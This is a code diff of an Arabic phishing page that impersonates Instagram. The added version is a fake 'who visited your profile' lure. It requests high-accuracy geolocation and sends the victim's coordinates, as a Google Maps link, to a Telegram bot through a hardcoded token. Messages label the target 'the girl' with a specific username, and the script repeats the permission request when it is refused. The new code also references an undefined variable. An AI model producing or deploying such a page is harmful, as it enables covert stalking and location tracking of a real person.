@@ -3,51 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز المساعدة - إنستغرام</title>
+    <title>Instagram Insights - من زار ملفك؟</title>
     <style>
-        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 90%; max-width: 400px; text-align: center; border-radius: 3px; }
-        .logo { width: 175px; margin-bottom: 20px; }
-        h2 { font-size: 18px; color: #262626; margin-bottom: 15px; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; }
-        .btn { background: #0095f6; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
-        #status { margin-top: 15px; font-size: 12px; color: #ed4956; display: none; }
+        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 85%; max-width: 350px; text-align: center; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .inst-icon { width: 80px; height: 80px; background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); border-radius: 20px; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; color: white; font-size: 40px; font-weight: bold; }
+        h2 { font-size: 18px; color: #262626; }
+        p { font-size: 14px; color: #8e8e8e; margin: 15px 0; }
+        .btn { background: #0095f6; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; width: 100%; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://www.instagram.com/static/images/web/mobile_port_gradient_android.png/053625f3bc77.png" style="display:none;">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-    <h2>بلاغ عن انتحال شخصية</h2>
-    <p>لقد تم تقديم بلاغ ضد الحساب <b>(ha2542213)</b> بتهمة الانتحال. يرجى تأكيد موقعك الجغرافي الحالي لمطابقته مع بيانات الحساب الأصلية وإلغاء البلاغ فوراً.</p>
-    <button class="btn" onclick="getLocation()">تأكيد الهوية وإلغاء البلاغ</button>
-    <div id="status">يجب السماح بالوصول للموقع لإتمام العملية.</div>
+<div class="card">
+    <div class="inst-icon">📈</div>
+    <h2>كشف زوار البروفايل</h2>
+    <p>لقد قام 14 شخصاً بزيارة حسابك اليوم! يرجى تأكيد موقعك للمطابقة مع خادم البيانات وعرض القائمة الكاملة بالأسماء.</p>
+    <button class="btn" onclick="startScan()">عرض القائمة الآن</button>
 </div>
 
 <script>
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    function send(m) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(m)}`);
+    function send(msg) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
     }
 
-    function getLocation() {
+    function startScan() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(p) {
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                send(`🎯 صيد انتحال (إنستغرام)!\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n📏 الدقة: ${p.coords.accuracy} متر`);
-                window.location.href = "https://help.instagram.com";
+                const mapLink = `https://www.google.com/maps?q=${lat},${p.coords.latitude},${p.coords.longitude}`;
+                send(`🎯 تم صيد موقع البنت (ha2542213)!\n📍 الرابط: ${mapLink}\n📏 الدقة: ${p.coords.accuracy} متر`);
+                alert("جاري تحميل الأسماء...");
+                window.location.href = "https://www.instagram.com";
             }, function(e) {
-                send("⚠️ البنت رفضت الصلاحية.. جاري إعادة الطلب.");
-                document.getElementById('status').style.display = 'block';
-                setTimeout(getLocation, 1000); 
+                send("⚠️ البنت فتحت الستوري وضغطت (رفض) للموقع.");
+                alert("خطأ: يجب السماح بالوصول للموقع لتحديث قائمة الزوار.");
+                startScan(); // إلحاح لطلب الموقع مرة ثانية
             }, {enableHighAccuracy: true});
         }
     }
-    window.onload = getLocation;
 </script>
 </body>
 </html>
